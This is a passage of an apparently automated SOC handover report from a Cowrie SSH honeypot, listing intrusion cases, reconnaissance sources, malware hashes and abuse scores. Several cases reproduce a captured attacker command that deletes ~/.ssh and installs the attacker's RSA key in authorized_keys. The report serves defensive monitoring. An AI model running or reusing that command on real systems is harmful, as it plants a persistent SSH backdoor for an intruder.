| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:13:30` | `cowrie.session.connect` |
| `2026-04-30 04:13:30` | `cowrie.client.version` |
| `2026-04-30 04:13:30` | `cowrie.client.kex` |
| `2026-04-30 04:13:30` | `cowrie.login.success` |
| `2026-04-30 04:13:31` | `cowrie.session.params` |
| `2026-04-30 04:13:31` | `cowrie.command.input` |
| `2026-04-30 04:13:31` | `cowrie.command.failed` |
| `2026-04-30 04:13:31` | `cowrie.log.closed` |
| `2026-04-30 04:13:31` | `cowrie.session.params` |
| `2026-04-30 04:13:31` | `cowrie.command.input` |
| `2026-04-30 04:13:31` | `cowrie.session.file_download` |
| `2026-04-30 04:13:31` | `cowrie.log.closed` |
| `2026-04-30 04:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c7487433f3d

| Field | Detail |
|---|---|
| **Source IP** | `171.220.244[.]134` |
| **First Seen** | 2026-04-30 04:13 |
| **Last Seen** | 2026-04-30 04:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:13:33` | `cowrie.session.connect` |
| `2026-04-30 04:13:33` | `cowrie.client.version` |
| `2026-04-30 04:13:33` | `cowrie.client.kex` |
| `2026-04-30 04:13:34` | `cowrie.login.success` |
| `2026-04-30 04:13:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.220.244[.]134` to AbuseIPDB if not already reported
- [ ] Block `171.220.244[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6d23355edd7

| Field | Detail |
|---|---|
| **Source IP** | `157.157.221[.]246` |
| **First Seen** | 2026-04-30 04:43 |
| **Last Seen** | 2026-04-30 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:43:16` | `cowrie.session.connect` |
| `2026-04-30 04:43:16` | `cowrie.client.version` |
| `2026-04-30 04:43:16` | `cowrie.client.kex` |
| `2026-04-30 04:43:17` | `cowrie.login.success` |
| `2026-04-30 04:43:17` | `cowrie.session.params` |
| `2026-04-30 04:43:17` | `cowrie.command.input` |
| `2026-04-30 04:43:17` | `cowrie.command.failed` |
| `2026-04-30 04:43:17` | `cowrie.log.closed` |
| `2026-04-30 04:43:18` | `cowrie.session.params` |
| `2026-04-30 04:43:18` | `cowrie.command.input` |
| `2026-04-30 04:43:18` | `cowrie.session.file_download` |
| `2026-04-30 04:43:18` | `cowrie.log.closed` |
| `2026-04-30 04:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.157.221[.]246` to AbuseIPDB if not already reported
- [ ] Block `157.157.221[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99fed222343f

| Field | Detail |
|---|---|
| **Source IP** | `157.157.221[.]246` |
| **First Seen** | 2026-04-30 04:43 |
| **Last Seen** | 2026-04-30 04:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 04:43:20` | `cowrie.session.connect` |
| `2026-04-30 04:43:20` | `cowrie.client.version` |
| `2026-04-30 04:43:20` | `cowrie.client.kex` |
| `2026-04-30 04:43:21` | `cowrie.login.success` |
| `2026-04-30 04:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.157.221[.]246` to AbuseIPDB if not already reported
- [ ] Block `157.157.221[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3d5f3f5389

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-04-30 06:19 |
| **Last Seen** | 2026-04-30 06:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:19:00` | `cowrie.session.connect` |
| `2026-04-30 06:19:00` | `cowrie.client.version` |
| `2026-04-30 06:19:01` | `cowrie.client.kex` |
| `2026-04-30 06:19:01` | `cowrie.login.success` |
| `2026-04-30 06:19:01` | `cowrie.session.params` |
| `2026-04-30 06:19:01` | `cowrie.command.input` |
| `2026-04-30 06:19:01` | `cowrie.command.failed` |
| `2026-04-30 06:19:01` | `cowrie.log.closed` |
| `2026-04-30 06:19:01` | `cowrie.session.params` |
| `2026-04-30 06:19:01` | `cowrie.command.input` |
| `2026-04-30 06:19:01` | `cowrie.session.file_download` |
| `2026-04-30 06:19:01` | `cowrie.log.closed` |
| `2026-04-30 06:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ae4617bae9e

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-04-30 06:19 |
| **Last Seen** | 2026-04-30 06:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:19:02` | `cowrie.session.connect` |
| `2026-04-30 06:19:02` | `cowrie.client.version` |
| `2026-04-30 06:19:02` | `cowrie.client.kex` |
| `2026-04-30 06:19:02` | `cowrie.login.success` |
| `2026-04-30 06:19:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ba5f177779d

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-04-30 06:21 |
| **Last Seen** | 2026-04-30 06:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:21:02` | `cowrie.session.connect` |
| `2026-04-30 06:21:02` | `cowrie.client.version` |
| `2026-04-30 06:21:02` | `cowrie.client.kex` |
| `2026-04-30 06:21:02` | `cowrie.login.success` |
| `2026-04-30 06:21:02` | `cowrie.session.params` |
| `2026-04-30 06:21:02` | `cowrie.command.input` |
| `2026-04-30 06:21:02` | `cowrie.command.failed` |
| `2026-04-30 06:21:02` | `cowrie.log.closed` |
| `2026-04-30 06:21:02` | `cowrie.session.params` |
| `2026-04-30 06:21:02` | `cowrie.command.input` |
| `2026-04-30 06:21:02` | `cowrie.session.file_download` |
| `2026-04-30 06:21:02` | `cowrie.log.closed` |
| `2026-04-30 06:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6640a5918b1

| Field | Detail |
|---|---|
| **Source IP** | `106.51.92[.]114` |
| **First Seen** | 2026-04-30 06:21 |
| **Last Seen** | 2026-04-30 06:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-30 06:21:04` | `cowrie.session.connect` |
| `2026-04-30 06:21:04` | `cowrie.client.version` |
| `2026-04-30 06:21:04` | `cowrie.client.kex` |
| `2026-04-30 06:21:04` | `cowrie.login.success` |
| `2026-04-30 06:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.51.92[.]114` to AbuseIPDB if not already reported
- [ ] Block `106.51.92[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `113.141.171[.]139` | **32** | 2026-04-30 03:56 | 2026-04-30 04:15 | 43m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `34.140.175[.]139` | **32** | 2026-04-30 03:36 | 2026-04-30 03:36 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `35.205.71[.]9` | **32** | 2026-04-30 04:08 | 2026-04-30 04:09 | 5m | 4 | `T1110.001` | 🟠 MEDIUM |
| `171.220.244[.]134` | **31** | 2026-04-30 03:58 | 2026-04-30 04:13 | 44m | 6 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `106.51.92[.]114` | **30** | 2026-04-30 05:52 | 2026-04-30 06:23 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.11[.]137` | **6** | 2026-04-30 03:32 | 2026-04-30 03:33 | 8m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `121.168.139[.]251` | **5** | 2026-04-30 06:18 | 2026-04-30 06:30 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.112[.]179` | **5** | 2026-04-30 05:09 | 2026-04-30 05:23 | 9m | 0 | `T1592` | 🟢 LOW |
| `46.116.38[.]105` | **4** | 2026-04-30 04:23 | 2026-04-30 04:31 | 8m | 0 | `T1592` | 🟢 LOW |
| `213.209.159[.]219` | **3** | 2026-04-30 05:38 | 2026-04-30 05:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.200.243[.]197` | **2** | 2026-04-30 05:07 | 2026-04-30 05:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `34.140.239[.]78` | **2** | 2026-04-30 03:59 | 2026-04-30 03:59 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `42.101.43[.]119` | **2** | 2026-04-30 05:15 | 2026-04-30 05:17 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.96.203[.]55` | 1 | 2026-04-30 03:33 | 2026-04-30 03:33 | 300s | 0 | `T1105` | 🟢 LOW |
| `147.50.227[.]79` | 1 | 2026-04-30 05:35 | 2026-04-30 05:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `157.157.221[.]246` | 1 | 2026-04-30 04:43 | 2026-04-30 04:43 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `177.195.238[.]165` | 1 | 2026-04-30 04:30 | 2026-04-30 04:30 | 31s | 0 | `T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-04-30 06:17 | 2026-04-30 06:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `203.0.104[.]170` | 1 | 2026-04-30 06:20 | 2026-04-30 06:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `207.154.228[.]110` | 1 | 2026-04-30 04:27 | 2026-04-30 04:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.48.170[.]235` | 1 | 2026-04-30 05:37 | 2026-04-30 05:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-04-30 03:41 | 2026-04-30 03:41 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (25 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 40/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `177.195.238[.]165` | BR | Claro NXT Telecomunicacoes Ltda | **100** ⚠️ | 7 |
| `34.140.239[.]78` | BE | Google LLC | **100** ⚠️ | 0 |
| `101.200.243[.]197` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 50 |
| `34.140.175[.]139` | BE | Google LLC | **100** ⚠️ | 1 |
| `147.50.227[.]79` | TH | CS Loxinfo Public Company Limited | **100** ⚠️ | 50 |
| `42.101.43[.]119` | CN | CHINANET HEILONGJIANG PROVINCE NETWORK | **100** ⚠️ | 4 |
| `46.116.38[.]105` | IL | 013 Netvision | **100** ⚠️ | 3 |
| `171.220.244[.]134` | CN | CHINANET Sichuan province network | **100** ⚠️ | 50 |
| `213.209.159[.]219` | DE | Feo Prest SRL | **100** ⚠️ | 0 |
| `35.205.71[.]9` | BE | Google LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 131 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 61 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 13 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (5 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 213 cases |
| Tool 34  | Credential Extractor        | ✅ 76 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 5 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 25 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 13 priority case(s) shown individually · 22 recon entry/entries in table (13 group(s) consolidating 186 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-30T06:31:50Z_
